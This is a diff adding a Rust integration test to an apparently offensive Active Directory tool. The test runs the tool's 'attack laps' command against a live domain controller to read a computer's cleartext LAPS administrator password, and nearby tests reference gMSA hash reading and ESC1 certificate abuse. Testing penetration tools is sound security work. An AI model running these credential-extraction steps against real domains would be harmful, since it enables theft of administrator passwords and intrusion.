@@ -187,6 +187,40 @@ fn gmsa_read_returns_nt_hash() {
 
 #[test]
 #[ignore = "live DC"]
+fn laps_reads_cleartext() {
+    // Needs a computer with a readable LAPS password: set ADH_LAPS_TARGET=<HOST$>.
+    // Optionally ADH_LAPS_EXPECT=<password substring> to assert the exact value.
+    let Some(target) = env("ADH_LAPS_TARGET") else {
+        return;
+    };
+    let url = format!("ldaps://{}:636", dc());
+    let bind_user = format!("{}\\{}", domain(), user());
+    let Some(o) = run(&[
+        "attack",
+        "laps",
+        "--url",
+        &url,
+        "--user",
+        &bind_user,
+        "--password",
+        &pass(),
+        "--insecure",
+        "--target",
+        &target,
+    ]) else {
+        return;
+    };
+    // Output is `HOST$<TAB>account<TAB>password`; assert the host line came back with a value.
+    let line = o.lines().find(|l| l.contains(&target)).expect("laps line");
+    let pw = line.split('\t').nth(2).unwrap_or("");
+    assert!(!pw.is_empty(), "no cleartext LAPS password parsed: {line}");
+    if let Some(expect) = env("ADH_LAPS_EXPECT") {
+        assert!(pw.contains(&expect), "LAPS password {pw} != expected {expect}");
+    }
+}
+
+#[test]
+#[ignore = "live DC"]
 fn esc1_enrolls_certificate() {
     let ca = env("ADH_CA").unwrap_or_else(|| "corp-CA".into());
     let template = env("ADH_TEMPLATE").unwrap_or_else(|| "User".into());
